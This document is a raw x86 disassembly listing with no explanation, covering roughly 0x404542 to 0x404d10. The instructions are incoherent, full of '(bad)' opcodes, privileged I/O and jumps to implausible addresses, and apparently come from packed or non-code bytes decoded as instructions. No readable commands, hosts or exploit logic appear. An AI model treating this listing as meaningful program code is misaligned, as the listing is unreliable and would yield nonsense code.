  404542:	lods   al,BYTE PTR ds:[esi]
  404543:	add    BYTE PTR [ecx+ebx*1+0x3ec2cc9a],al
  40454a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40454b:	fisttp QWORD PTR [ebx]
  40454d:	das    
  40454e:	out    0xbe,eax
  404550:	and    al,0xe0
  404552:	and    ebx,DWORD PTR [edi-0x179aeeef]
  404558:	into   
  404559:	jnp    0x4044fd
  40455b:	loope  0x40454c
  40455d:	imul   esp,ebx,0x209dc8fa
  404563:	add    eax,edx
  404565:	int3   
  404566:	popa   
  404567:	push   esp
  404568:	cmp    bh,BYTE PTR [ecx-0x65feaa52]
  40456e:	out    dx,eax
  40456f:	jbe    0x40457d
  404571:	push   edi
  404572:	sub    al,0x67
  404574:	pop    edi
  404575:	xchg   DWORD PTR [ebp+0x0],ebp
  404578:	push   edx
  404579:	sbb    eax,0x25bab25
  40457e:	adc    al,0xea
  404580:	lock test DWORD PTR [esi+0x29],0x68760059
  404588:	dec    esp
  404589:	mov    dh,0x79
  40458b:	div    BYTE PTR [ebp-0x3f]
  40458e:	inc    esi
  40458f:	mov    bh,0xce
  404591:	fcomp  QWORD PTR [ecx]
  404593:	je     0x40455c
  404595:	ret    
  404596:	sub    BYTE PTR ds:0xf2bd0290,dh
  40459c:	pop    ecx
  40459d:	sbb    eax,0x72b38c
  4045a2:	fbstp  TBYTE PTR [eax+0x1b]
  4045a5:	imul   ebp
  4045a7:	xor    DWORD PTR [eax],eax
  4045a9:	aam    0x7f
  4045ab:	repnz (bad) 
  4045ad:	std    
  4045ae:	js     0x404573
  4045b0:	mov    edi,0x7c9085d6
  4045b5:	out    dx,eax
  4045b6:	call   0xfa37:0x5bf83da1
  4045bd:	add    DWORD PTR [ebp+0x6],eax
  4045c0:	mov    ebx,0x78552a3a
  4045c5:	and    edi,DWORD PTR [edi]
  4045c7:	cmp    DWORD PTR fs:[eax+0x52],eax
  4045cb:	cdq    
  4045cc:	dec    ebx
  4045cd:	imul   eax,DWORD PTR [ebp-0x58],0xfb22420a
  4045d4:	leave  
  4045d5:	dec    ebx
  4045d6:	dec    ebx
  4045d7:	retf   0xfc88
  4045da:	mov    ebx,DWORD PTR [edi+ecx*2+0x5]
  4045de:	jno    0x40464d
  4045e0:	push   cs
  4045e1:	push   ds
  4045e2:	xchg   BYTE PTR [esi],bh
  4045e4:	int    0xf7
  4045e6:	sahf   
  4045e7:	jl     0x43534c35
  4045ed:	jno    0x40460c
  4045ef:	and    al,BYTE PTR [edx]
  4045f1:	(bad)
  4045f6:	or     ebx,DWORD PTR [ebx]
  4045f8:	inc    ecx
  4045f9:	loop   0x404622
  4045fb:	fcom   st(6)
  4045fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045fe:	cmp    cl,dh
  404600:	in     eax,0x5c
  404602:	adc    eax,0xf727b502
  404607:	inc    BYTE PTR [ebx-0x75bdde22]
  40460d:	add    BYTE PTR [eax+0x2a],bh
  404610:	aas    
  404611:	mov    ebx,0xe817f339
  404616:	jmp    0xefa5:0xabd9310c
  40461d:	dec    esi
  40461e:	pop    esp
  40461f:	mov    dh,0xd8
  404621:	jge    0x404638
  404623:	xlat   BYTE PTR ds:[ebx]
  404624:	sti    
  404625:	sub    al,0xce
  404627:	mov    eax,0x39871c02
  40462c:	jge    0x40462e
  40462e:	jo     0x404642
  404630:	test   BYTE PTR [ecx],dh
  404632:	xor    DWORD PTR [ebx],edi
  404634:	jae    0x404698
  404636:	repnz inc esp
  404638:	push   esi
  404639:	push   ebx
  40463a:	mov    bl,0x7d
  40463c:	cdq    
  40463d:	lds    edx,FWORD PTR [esi+edi*2-0x50]
  404641:	hlt    
  404642:	or     eax,0xd6a7c75f
  404647:	push   eax
  404648:	mov    edx,0x8708f96
  40464d:	mov    esp,0x8d016f4b
  404652:	or     cl,BYTE PTR [esi-0x2e]
  404655:	fnstsw WORD PTR [ecx+0x78eeef3d]
  40465b:	or     al,0x2c
  40465d:	jns    0x4046ae
  40465f:	jecxz  0x404675
  404661:	dec    eax
  404662:	push   es
  404663:	or     bh,BYTE PTR [esi]
  404665:	sbb    edi,DWORD PTR [ebp+0x742a4b11]
  40466b:	(bad)  [ebp-0x6045ab3f]
  404671:	mov    BYTE PTR [eax],0x5d
  404674:	jns    0x404632
  404676:	stos   DWORD PTR es:[edi],eax
  404677:	mov    dh,0x3c
  404679:	popf   
  40467a:	xchg   esp,eax
  40467b:	jg     0x404678
  40467d:	jmp    0xe3fe37d7
  404682:	push   0x20
  404684:	jge    0x40463e
  404686:	xchg   ebx,edx
  404688:	aas    
  404689:	rol    DWORD PTR [eax-0x3934013e],0xc
  404690:	sbb    ebp,0xbec1f5c1
  404696:	xchg   esp,eax
  404697:	sahf   
  404698:	add    bl,BYTE PTR [edi+0x6843c7ab]
  40469e:	push   0x49
  4046a0:	test   DWORD PTR [ecx+0x55],esp
  4046a3:	sbb    dh,al
  4046a5:	jp     0x404627
  4046a7:	pop    ebx
  4046a8:	pop    es
  4046a9:	add    DWORD PTR [edi-0x2bb796],0x41
  4046b0:	mov    ebp,edx
  4046b2:	or     BYTE PTR [edi-0x36],ch
  4046b5:	imul   ch
  4046b7:	daa    
  4046b8:	or     esp,edi
  4046ba:	ror    BYTE PTR [esp+ecx*2],cl
  4046bd:	xor    BYTE PTR [ebx+eax*4],dl
  4046c0:	mov    WORD PTR [ecx],ds
  4046c2:	sub    eax,0x49f2cd92
  4046c7:	loope  0x4046d7
  4046c9:	or     edi,DWORD PTR [edi]
  4046cb:	mov    al,0x4f
  4046cd:	xor    ebx,DWORD PTR [ebp-0x5dc5e7cb]
  4046d3:	cmp    al,0xd7
  4046d5:	push   eax
  4046d6:	iret   
  4046d7:	add    BYTE PTR [edi],dl
  4046d9:	xchg   esi,eax
  4046da:	dec    eax
  4046db:	mov    eax,0x799754de
  4046e0:	push   eax
  4046e1:	adc    esi,DWORD PTR [esi-0x72]
  4046e4:	adc    edx,0x49c15400
  4046ea:	leave  
  4046eb:	xchg   BYTE PTR gs:[eax],bl
  4046ee:	mov    dl,ch
  4046f0:	push   es
  4046f1:	es inc edi
  4046f3:	add    esi,DWORD PTR [esi]
  4046f5:	xor    eax,DWORD PTR [esi]
  4046f7:	fcom   DWORD PTR [eax+ecx*1]
  4046fa:	vpsrlq xmm7,xmm7,0x83
  4046ff:	mov    ss,WORD PTR [edx+0x2d7f4361]
  404705:	jo     0x404709
  404707:	pushf  
  404708:	dec    eax
  404709:	ret    
  40470a:	rcr    DWORD PTR [ebp+0x6880923f],0xbe
  404711:	popf   
  404712:	push   ds
  404713:	add    ecx,0x5c9a5fca
  404719:	jle    0x4046b7
  40471b:	or     ebx,0x6c
  40471e:	(bad)  
  404720:	jp     0x4046fb
  404722:	sbb    DWORD PTR [ebp-0x61a4f7db],edi
  404728:	cmp    BYTE PTR [ebx],0x98
  40472b:	lahf   
  40472c:	inc    edi
  40472d:	sub    bl,cl
  40472f:	xor    bh,al
  404731:	push   ss
  404732:	push   ss
  404733:	cmp    eax,edi
  404735:	inc    edi
  404736:	push   edi
  404737:	adc    dl,ch
  404739:	hlt    
  40473a:	xchg   ebx,eax
  40473b:	or     eax,DWORD PTR [eax]
  40473d:	mov    dl,0xe5
  40473f:	aam    0xd4
  404741:	rcl    BYTE PTR [ebx+0x12],cl
  404744:	mov    ch,0xef
  404746:	adc    DWORD PTR [ebx-0x2a],0xe790b108
  40474d:	add    DWORD PTR [eax-0x3580382f],esp
  404753:	in     eax,dx
  404754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404755:	mov    bl,BYTE PTR [ebx+0x6899c5ac]
  40475b:	outs   dx,DWORD PTR ds:[esi]
  40475c:	aam    0x90
  40475e:	jns    0x40478e
  404760:	add    BYTE PTR [ecx-0x35],ah
  404763:	xor    al,0xe8
  404765:	push   0x43a905d4
  40476a:	mov    esi,0xa70a6a52
  40476f:	sub    ebx,DWORD PTR gs:[ebp-0x7b1b87c2]
  404776:	cmp    DWORD PTR [ecx-0x5b],ecx
  404779:	lahf   
  40477a:	dec    esp
  40477b:	sbb    ah,BYTE PTR [esi-0x6a]
  40477e:	push   ebx
  40477f:	sub    esp,DWORD PTR [edi]
  404781:	stc    
  404782:	xchg   edx,eax
  404783:	mov    ebp,0x8c8d50e0
  404788:	mov    eax,ds:0x62df783b
  40478d:	push   edx
  40478e:	jg     0x40477e
  404790:	and    ebx,edi
  404792:	and    eax,0x3ec6bde0
  404797:	sar    esp,1
  404799:	pop    ebp
  40479a:	push   ebx
  40479b:	cmp    BYTE PTR [edi],0x54
  40479e:	dec    esp
  40479f:	mov    bl,0x7e
  4047a1:	add    BYTE PTR [ebx-0x73],bh
  4047a4:	and    eax,0x149212b9
  4047a9:	clc    
  4047aa:	jns    0x40482b
  4047ac:	inc    edi
  4047ad:	cmp    edx,DWORD PTR [eax+0x78]
  4047b0:	jbe    0x40482c
  4047b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047b3:	lock imul esi,DWORD PTR [ebp-0xba51c42],0x37080ae5
  4047be:	in     al,dx
  4047bf:	adc    DWORD PTR [ecx],edi
  4047c1:	jbe    0x4047e6
  4047c3:	aad    0xae
  4047c5:	mov    cl,0x2a
  4047c7:	enter  0xf09f,0x1
  4047cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047cc:	retf   0x833
  4047cf:	mov    esi,0xd94b72fd
  4047d4:	add    BYTE PTR [eax],al
  4047d6:	dec    edx
  4047d7:	fwait
  4047d8:	imul   esi,DWORD PTR [edi],0x62
  4047db:	scas   eax,DWORD PTR es:[edi]
  4047dc:	xchg   ah,dl
  4047de:	mov    ah,0xb0
  4047e0:	inc    esp
  4047e1:	mov    esi,0xa80db39b
  4047e6:	push   ss
  4047e7:	mov    ebp,0xb739c2cb
  4047ec:	xchg   ecx,eax
  4047ed:	jl     0x4047df
  4047ef:	mov    ebp,0xcce7164f
  4047f4:	repz push eax
  4047f6:	fidiv  DWORD PTR [ebx-0x4222c44b]
  4047fc:	ja     0x404783
  4047fe:	sub    al,0xa7
  404800:	cmp    edi,ebp
  404802:	add    ecx,edx
  404804:	clc    
  404805:	clc    
  404806:	add    BYTE PTR [esi-0x36],bh
  404809:	mov    edx,0x7cb89193
  40480e:	sub    eax,0x473eb758
  404813:	lahf   
  404814:	fsubrp st(6),st
  404816:	mov    ds:0xc9a6c552,al
  40481b:	and    eax,0x647760cb
  404820:	mov    ah,0x22
  404822:	sbb    eax,0xaedb78b
  404827:	push   es
  404828:	mov    ecx,0xaac961af
  40482d:	imul   ebx,edi,0xb52ba9a0
  404833:	xchg   edi,eax
  404834:	rcl    bh,0xf1
  404837:	stos   BYTE PTR es:[edi],al
  404838:	mov    edi,0xc18d9895
  40483d:	push   ebx
  40483e:	es mov esp,0xd34c11c2
  404844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404845:	ficomp WORD PTR [ecx+0x4e]
  404848:	scas   al,BYTE PTR es:[edi]
  404849:	pushf  
  40484a:	xor    BYTE PTR [ecx-0x5c],al
  40484d:	pop    edx
  40484e:	mov    gs,eax
  404850:	stos   BYTE PTR es:[edi],al
  404851:	sbb    ah,ah
  404853:	scas   eax,DWORD PTR es:[edi]
  404854:	fstp   DWORD PTR [edi]
  404856:	dec    edi
  404857:	pushf  
  404858:	mov    ecx,0xac7e8d21
  40485d:	adc    ecx,ebx
  40485f:	lock push edx
  404861:	adc    cl,BYTE PTR [ecx]
  404863:	cmp    al,BYTE PTR [edx+0x5444807]
  404869:	inc    BYTE PTR [ebp-0xc301a00]
  40486f:	ret    
  404870:	push   0xb201ed27
  404875:	fidivr WORD PTR ds:0x7fd7216d
  40487c:	(bad)  
  40487d:	xor    al,0xdd
  40487f:	mov    ecx,0xfbd40b21
  404884:	retf   0xb8d9
  404887:	xor    al,0xb5
  404889:	pop    esp
  40488a:	mov    eax,0xba881776
  40488f:	mov    al,0x79
  404891:	scas   eax,DWORD PTR es:[edi]
  404892:	mov    ebx,0xca662f2
  404897:	sub    DWORD PTR [edi-0x2294fa98],edi
  40489d:	jnp    0x4048ae
  40489f:	lods   eax,DWORD PTR ds:[esi]
  4048a0:	xchg   ebx,eax
  4048a1:	ret    
  4048a2:	push   es
  4048a3:	out    dx,eax
  4048a4:	sbb    BYTE PTR [edx+0x1527220b],dl
  4048aa:	or     ah,BYTE PTR [ebp+eax*4+0x40]
  4048ae:	or     BYTE PTR [esi-0x17f70935],ah
  4048b4:	nop
  4048b5:	in     eax,dx
  4048b6:	rcr    DWORD PTR [ebx],1
  4048b8:	into   
  4048b9:	lock rcr BYTE PTR [ecx-0x54],cl
  4048bd:	jecxz  0x40487f
  4048bf:	lahf   
  4048c0:	add    bl,BYTE PTR [ebx]
  4048c2:	rcr    ch,0x6b
  4048c5:	dec    edx
  4048c6:	aad    0x12
  4048c8:	push   esi
  4048c9:	int    0xcc
  4048cb:	push   eax
  4048cc:	hlt    
  4048cd:	xchg   edi,eax
  4048ce:	add    edi,eax
  4048d0:	add    ah,cl
  4048d2:	nop
  4048d3:	fwait
  4048d4:	mov    esi,0xd9ac7936
  4048d9:	fist   DWORD PTR [ecx+eax*8-0x28]
  4048dd:	mov    DWORD PTR [edx+0x2247daf6],edi
  4048e3:	scas   eax,DWORD PTR es:[edi]
  4048e4:	(bad)  
  4048e6:	push   es
  4048e7:	cwde   
  4048e8:	mov    esi,0xb71cfcb2
  4048ed:	jo     0x404901
  4048ef:	sub    bh,BYTE PTR [ebp-0x4b8c35d2]
  4048f5:	aam    0x5e
  4048f7:	inc    esp
  4048f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048f9:	call   0x9adec2a3
  4048fe:	mov    ecx,DWORD PTR [esi-0x6c]
  404901:	push   esp
  404902:	rcl    DWORD PTR [esi],1
  404904:	lea    ebp,[esi]
  404906:	cmp    BYTE PTR [eax],ah
  404908:	and    cl,0x4d
  40490b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40490c:	and    DWORD PTR [ebx+0x5d7391e3],0xa772cb79
  404916:	(bad)  
  404917:	cld    
  404918:	push   ebp
  404919:	cmp    dh,bl
  40491b:	mov    al,0x4c
  40491d:	push   0xa646861d
  404922:	rcr    bh,0x3f
  404925:	fsubr  QWORD PTR [ecx-0x18]
  404928:	push   edx
  404929:	adc    ebx,DWORD PTR [ebx+0x6d]
  40492c:	push   ebx
  40492d:	push   ecx
  40492e:	mov    ch,0x5a
  404930:	inc    ecx
  404931:	(bad)
  404935:	add    ch,dh
  404937:	add    DWORD PTR [ebx+ecx*1],esi
  40493a:	or     DWORD PTR [edx+0x9],eax
  40493d:	or     bh,BYTE PTR [ebx]
  40493f:	in     al,dx
  404940:	cmp    eax,0x676f7508
  404945:	or     edi,ecx
  404947:	cwde   
  404948:	push   eax
  404949:	add    BYTE PTR [esi+0x37],ah
  40494c:	(bad)  
  40494d:	aam    0x67
  40494f:	stc    
  404950:	mov    ebx,0x3bb55e3
  404955:	mov    edx,0x8d687d64
  40495a:	adc    eax,DWORD PTR [edi-0x36eddf36]
  404960:	mov    eax,ds:0x1e0b0017
  404965:	dec    esi
  404966:	add    DWORD PTR [ebp+0x74],ecx
  404969:	jns    0x404957
  40496b:	jg     0x4049cf
  40496d:	cld    
  40496e:	std    
  40496f:	leave  
  404970:	or     ebx,ecx
  404972:	inc    DWORD PTR [ebx]
  404974:	mov    dh,0x92
  404976:	(bad)  
  404977:	cmp    eax,0x81c5a5dc
  40497c:	fwait
  40497d:	cwde   
  40497e:	(bad)  
  40497f:	xlat   BYTE PTR ds:[ebx]
  404980:	lock scas eax,DWORD PTR es:[edi]
  404982:	mov    dh,0x15
  404984:	dec    edi
  404985:	test   bh,0x5b
  404988:	and    eax,0x3390cac1
  40498d:	inc    esp
  40498e:	mov    ebx,0xb97358ce
  404993:	adc    al,0xe7
  404995:	sub    cl,BYTE PTR [eax]
  404997:	push   ebx
  404998:	lea    ebx,ds:0x696c9700
  40499e:	push   eax
  40499f:	xchg   esi,eax
  4049a0:	stos   BYTE PTR es:[edi],al
  4049a1:	add    BYTE PTR [edi-0x7c],ah
  4049a4:	call   0x26b58865
  4049a9:	xlat   BYTE PTR ds:[ebx]
  4049aa:	or     DWORD PTR [eax+0x65],ebx
  4049ad:	ror    DWORD PTR [ecx+ecx*2+0x4bbba8a3],0xe1
  4049b5:	adc    al,0xe2
  4049b7:	jp     0x4049d8
  4049b9:	jg     0x404990
  4049bb:	and    DWORD PTR [ebx+0x38],edi
  4049be:	call   0xdf9406e3
  4049c3:	bound  ecx,QWORD PTR [ecx]
  4049c5:	and    ebp,ebp
  4049c7:	in     al,0x7
  4049c9:	popa   
  4049ca:	xchg   DWORD PTR [ebx+0x3691adfc],esi
  4049d0:	in     al,0xeb
  4049d2:	cli    
  4049d3:	popa   
  4049d4:	jmp    0x2f67:0xcfb84529
  4049db:	(bad)  
  4049dc:	adc    ecx,edx
  4049de:	sbb    ah,dl
  4049e0:	adc    dl,BYTE PTR [ebx+0x55150d71]
  4049e6:	iret   
  4049e7:	dec    esp
  4049e8:	adc    al,0x17
  4049ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049eb:	sbb    edx,DWORD PTR [ecx]
  4049ed:	(bad)  
  4049ee:	mov    dl,0x8e
  4049f0:	pop    ss
  4049f1:	cwde   
  4049f2:	fnstcw WORD PTR [ecx+0x50675a0d]
  4049f8:	push   ss
  4049f9:	sbb    al,0xd
  4049fb:	pop    edi
  4049fc:	out    0xdf,eax
  4049fe:	dec    ecx
  4049ff:	add    BYTE PTR [edx-0x30],cl
  404a02:	popf   
  404a03:	and    BYTE PTR [ebp-0x2a],dl
  404a06:	arpl   WORD PTR [esi-0xbdc426c],bx
  404a0c:	sub    edx,0xffffffea
  404a0f:	loope  0x404a17
  404a11:	jmp    0x366e:0xdc1188a8
  404a18:	call   0x179c76f9
  404a1d:	mov    dh,0xf4
  404a1f:	mov    bh,0xd2
  404a21:	sahf   
  404a22:	mov    dl,0xd2
  404a24:	popf   
  404a25:	test   al,0x70
  404a27:	ins    BYTE PTR es:[edi],dx
  404a28:	fmul   QWORD PTR [edi-0x62f4f9d2]
  404a2e:	dec    DWORD PTR [edi]
  404a30:	jle    0x4049cd
  404a32:	mov    ebp,0x7b89497a
  404a37:	les    esp,FWORD PTR [eax]
  404a39:	mov    bh,BYTE PTR [ecx]
  404a3b:	scas   al,BYTE PTR es:[edi]
  404a3c:	psubusw mm3,QWORD PTR [edx-0x65ee84fc]
  404a43:	(bad)  
  404a44:	loope  0x404a86
  404a46:	cwde   
  404a47:	cmp    BYTE PTR [edi],0xf7
  404a4a:	cwde   
  404a4b:	inc    edx
  404a4c:	or     eax,0x230b7bea
  404a51:	gs jne 0x404a21
  404a54:	cmp    DWORD PTR [edi+edi*2-0x79],edi
  404a58:	test   edx,0x8e554976
  404a5e:	inc    ecx
  404a5f:	sbb    al,0xaf
  404a61:	cmp    DWORD PTR [eax+0x5e],eax
  404a64:	add    BYTE PTR [ebp-0x1467cdd8],cl
  404a6a:	into   
  404a6b:	xor    bl,dl
  404a6d:	inc    eax
  404a6e:	add    ah,BYTE PTR [esi]
  404a70:	adc    esi,DWORD PTR [edi]
  404a72:	jge    0x404a93
  404a74:	push   ebp
  404a75:	lds    edx,FWORD PTR [ebx+0x15]
  404a78:	pop    DWORD PTR [ebx-0x55]
  404a7b:	or     al,0xd1
  404a7d:	test   al,0xb6
  404a7f:	aas    
  404a80:	sub    eax,0x6b36a15e
  404a85:	jl     0x404a37
  404a87:	cmp    al,0xa9
  404a89:	sbb    al,BYTE PTR [edi+0x59b3e735]
  404a8f:	sbb    BYTE PTR [esi],ah
  404a91:	(bad)  
  404a92:	aam    0x18
  404a94:	fs adc al,0xc
  404a97:	sbb    esp,DWORD PTR [edx-0x1fe5ccae]
  404a9d:	jnp    0x404abd
  404a9f:	lods   eax,DWORD PTR ds:[esi]
  404aa0:	cmp    esp,ecx
  404aa2:	call   0xf82ec24a
  404aa7:	lods   eax,DWORD PTR ds:[esi]
  404aa8:	mov    ebp,0xfba73f88
  404aad:	jne    0x404ac1
  404aaf:	stos   BYTE PTR es:[edi],al
  404ab0:	xor    BYTE PTR [ecx*4-0x3b999155],dl
  404ab7:	add    DWORD PTR [eax-0x565ca52a],ebp
  404abd:	nop
  404abe:	mov    bh,0x94
  404ac0:	mov    dl,0x24
  404ac2:	jo     0x404a6d
  404ac4:	mov    bl,0xda
  404ac6:	xchg   ebp,eax
  404ac7:	sahf   
  404ac8:	mov    eax,ds:0xc743a800
  404acd:	mov    al,ds:0xb5efea66
  404ad2:	sub    eax,0xe3ac74d8
  404ad7:	sub    eax,0xab21a642
  404adc:	sbb    ebx,DWORD PTR [edi+0x782c805f]
  404ae2:	mov    edx,0x7c794167
  404ae7:	mov    ebp,0x194e7b76
  404aec:	das    
  404aed:	jp     0x404af7
  404aef:	repnz pop ss
  404af1:	pop    edi
  404af2:	ret    
  404af3:	call   FWORD PTR [esi+edx*2+0x5caa2545]
  404afa:	pop    es
  404afb:	mov    cl,0xf3
  404afd:	push   ebp
  404afe:	rcr    DWORD PTR [ecx-0x3c],0x86
  404b02:	mov    ch,0x96
  404b04:	stc    
  404b05:	jg     0x404b72
  404b07:	ins    BYTE PTR es:[edi],dx
  404b08:	into   
  404b09:	jne    0x404b24
  404b0b:	in     al,dx
  404b0c:	xchg   esi,eax
  404b0d:	ins    BYTE PTR es:[edi],dx
  404b0e:	xlat   BYTE PTR ds:[ebx]
  404b0f:	inc    eax
  404b10:	mov    al,ds:0x252e9c61
  404b15:	pusha  
  404b16:	push   edx
  404b17:	aam    0x11
  404b19:	push   edx
  404b1a:	mov    al,0x83
  404b1c:	dec    ebx
  404b1d:	push   ebx
  404b1e:	out    dx,al
  404b1f:	test   al,0x7c
  404b21:	je     0x404b02
  404b23:	add    al,0x31
  404b25:	ins    DWORD PTR es:[edi],dx
  404b26:	sbb    DWORD PTR [esi],ebx
  404b28:	push   es
  404b29:	imul   edi,DWORD PTR [bx+si+0x5e5f],0x0
  404b2f:	popf   
  404b30:	push   edx
  404b31:	push   0x9c553100
  404b36:	in     al,dx
  404b37:	xor    BYTE PTR [ebx],bl
  404b39:	neg    bl
  404b3b:	add    bl,cl
  404b3d:	inc    edi
  404b3e:	add    BYTE PTR [ebx],0x7f
  404b41:	and    dh,BYTE PTR [ebp-0x779abd08]
  404b47:	stc    
  404b48:	cld    
  404b49:	push   cs
  404b4a:	mov    edi,0xe6aec70b
  404b4f:	or     al,BYTE PTR [ecx+0x49ffd1db]
  404b55:	int    0x54
  404b57:	inc    BYTE PTR [ebx]
  404b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b5a:	arpl   sp,cx
  404b5c:	scas   al,BYTE PTR es:[edi]
  404b5d:	push   ss
  404b5e:	cmp    bh,BYTE PTR [ebp-0xdf28c78]
  404b64:	jp     0x404b37
  404b66:	mov    al,ds:0x97b8b4f3
  404b6b:	loope  0x404b4b
  404b6d:	add    al,0xce
  404b6f:	loopne 0x404ba9
  404b71:	outs   dx,DWORD PTR ds:[esi]
  404b72:	stc    
  404b73:	aad    0x71
  404b75:	jns    0x404bf3
  404b77:	aam    0xab
  404b79:	adc    BYTE PTR [ebx-0x1a],cl
  404b7c:	cmc    
  404b7d:	lods   al,BYTE PTR ds:[esi]
  404b7e:	adc    dl,BYTE PTR [edi-0x63da38d0]
  404b84:	sbb    BYTE PTR fs:[eax],0x9d
  404b88:	stos   BYTE PTR es:[edi],al
  404b89:	jmp    0x404bba
  404b8b:	scas   eax,DWORD PTR es:[edi]
  404b8c:	call   0xedec1e4
  404b91:	ds inc ecx
  404b93:	add    BYTE PTR [ebx-0x653bd7a3],bl
  404b99:	mov    ds:0xe128f343,eax
  404b9e:	sti    
  404b9f:	stos   BYTE PTR es:[edi],al
  404ba0:	sub    DWORD PTR [edi],esp
  404ba2:	xchg   esi,eax
  404ba3:	popf   
  404ba4:	out    dx,al
  404ba5:	jge    0x404c19
  404ba7:	shr    bh,1
  404ba9:	mov    ebx,0x5e62e719
  404bae:	inc    edx
  404baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bb0:	hlt    
  404bb1:	data16 or ch,0xdb
  404bb5:	inc    ecx
  404bb6:	leave  
  404bb7:	fist   DWORD PTR [esi+0x43]
  404bba:	pop    es
  404bbb:	mov    cl,0x59
  404bbd:	inc    ecx
  404bbe:	dec    ebp
  404bbf:	sldt   WORD PTR [eax-0x75]
  404bc3:	gs aaa 
  404bc5:	cmp    ebp,DWORD PTR [edi-0xec605de]
  404bcb:	inc    edi
  404bcc:	sbb    eax,0x5cf63328
  404bd1:	sub    DWORD PTR [ebp-0x64],esi
  404bd4:	xor    edx,DWORD PTR [esp+esi*4]
  404bd7:	mov    ch,BYTE PTR [esi-0x1e200a04]
  404bdd:	add    edi,DWORD PTR [eax]
  404bdf:	pop    esi
  404be0:	cmp    ch,ch
  404be2:	jns    0x404c18
  404be4:	aas    
  404be5:	mov    bl,0x2
  404be7:	add    BYTE PTR [edx+0x7a],ah
  404bea:	push   esi
  404beb:	addr16 (bad) 
  404bed:	pop    eax
  404bee:	or     eax,0x51c0e9c8
  404bf3:	scas   eax,DWORD PTR es:[edi]
  404bf4:	cmp    al,0x44
  404bf6:	and    BYTE PTR [edi-0x4b3c7300],dl
  404bfc:	lock push eax
  404bfe:	int    0x29
  404c00:	pop    edi
  404c01:	ss push cs
  404c03:	scas   eax,DWORD PTR es:[edi]
  404c04:	cmp    bl,cl
  404c06:	in     eax,dx
  404c07:	dec    ebp
  404c08:	sub    ch,dh
  404c0a:	pop    ebp
  404c0b:	or     cl,BYTE PTR [edi-0x18]
  404c0e:	push   ebx
  404c0f:	pop    ecx
  404c10:	loopne 0x404c90
  404c12:	add    eax,DWORD PTR ds:0xac886387
  404c18:	mov    edi,0xd829c0aa
  404c1d:	mov    edi,0x9177b6d2
  404c22:	push   0x23
  404c24:	adc    BYTE PTR [ecx+ebx*8],dh
  404c27:	aaa    
  404c28:	sti    
  404c29:	sub    al,0x5c
  404c2b:	rcr    BYTE PTR [edi+0x72],1
  404c2e:	mov    edi,0xe5d4f4d2
  404c33:	sub    DWORD PTR [eax-0x56],ebp
  404c36:	dec    edx
  404c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c38:	sbb    DWORD PTR [edx-0x3a42b86f],esp
  404c3e:	outs   dx,BYTE PTR ds:[esi]
  404c3f:	cmp    eax,0x9d186a12
  404c44:	(bad)  
  404c45:	std    
  404c46:	bnd jl 0x404cb0
  404c49:	add    eax,0x55f2cd49
  404c4e:	out    0xd6,al
  404c50:	pop    edi
  404c51:	lods   eax,DWORD PTR ds:[esi]
  404c52:	shl    BYTE PTR [edi-0x4],0x9d
  404c56:	pop    ebx
  404c57:	loop   0x404c1d
  404c59:	jp     0x404c4f
  404c5b:	dec    ecx
  404c5c:	adc    DWORD PTR [eax],eax
  404c5e:	in     eax,dx
  404c5f:	push   ss
  404c60:	cmp    BYTE PTR [esi+0x19e06d82],bh
  404c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c67:	xchg   edx,eax
  404c68:	mov    dl,dl
  404c6a:	hlt    
  404c6b:	cli    
  404c6c:	inc    DWORD PTR [ebp-0x271ddfd6]
  404c72:	mov    esp,0x627d9a86
  404c77:	test   eax,0x326a3417
  404c7c:	push   edi
  404c7d:	test   al,0xbd
  404c7f:	int    0x6c
  404c81:	cmp    edx,DWORD PTR [edx]
  404c83:	mov    bh,0xed
  404c85:	sahf   
  404c86:	cmc    
  404c87:	push   ebx
  404c88:	lea    edi,[ebp-0x23]
  404c8b:	test   eax,0x851dda3d
  404c90:	daa    
  404c91:	test   DWORD PTR [ebp+0x45d0971f],esp
  404c97:	cld    
  404c98:	adc    DWORD PTR [eax+0x3b9a5352],esp
  404c9e:	push   ebp
  404c9f:	mov    eax,0xa0fca901
  404ca4:	or     al,0xf1
  404ca6:	nop
  404ca7:	jl     0x404d12
  404ca9:	fnstcw WORD PTR [edx+0x4f31a0c3]
  404caf:	pop    esp
  404cb0:	lds    esi,FWORD PTR [ebx]
  404cb2:	shr    bl,0x2a
  404cb5:	retf   
  404cb6:	aaa    
  404cb7:	and    al,0x4e
  404cb9:	inc    esi
  404cba:	sbb    DWORD PTR [edi+esi*8],ebp
  404cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cbe:	in     al,dx
  404cbf:	rcl    BYTE PTR [ecx+0x7421009c],1
  404cc5:	jl     0x404d03
  404cc7:	jmp    0x4fa9:0xedc1998
  404cce:	ins    BYTE PTR es:[edi],dx
  404ccf:	add    BYTE PTR [edx-0x1ef889d6],0xc3
  404cd6:	(bad)  
  404cd7:	jnp    0x404d13
  404cd9:	mov    eax,ds:0x1813cc43
  404cde:	jmp    0x404c80
  404ce0:	stc    
  404ce1:	jl     0x404cbc
  404ce3:	in     eax,0x4a
  404ce5:	xchg   ebx,eax
  404ce6:	inc    ecx
  404ce7:	cdq    
  404ce8:	mov    cl,0xf6
  404cea:	xor    BYTE PTR ds:0xce0a3c23,0xfa
  404cf1:	pop    eax
  404cf2:	sbb    BYTE PTR ds:0xc060b74b,ch
  404cf8:	ret    0xddd2
  404cfb:	push   edi
  404cfc:	mov    ch,BYTE PTR [ebx-0x73]
  404cff:	sub    esi,DWORD PTR [edx+0xe]
  404d02:	ja     0x404d72
  404d04:	rcr    bh,cl
  404d06:	out    0x22,eax
  404d08:	cmp    al,BYTE PTR [ebp-0x2cb67e39]
  404d0e:	pop    es
  404d0f:	cmc    
  404d10:	jecxz  0x404cc7
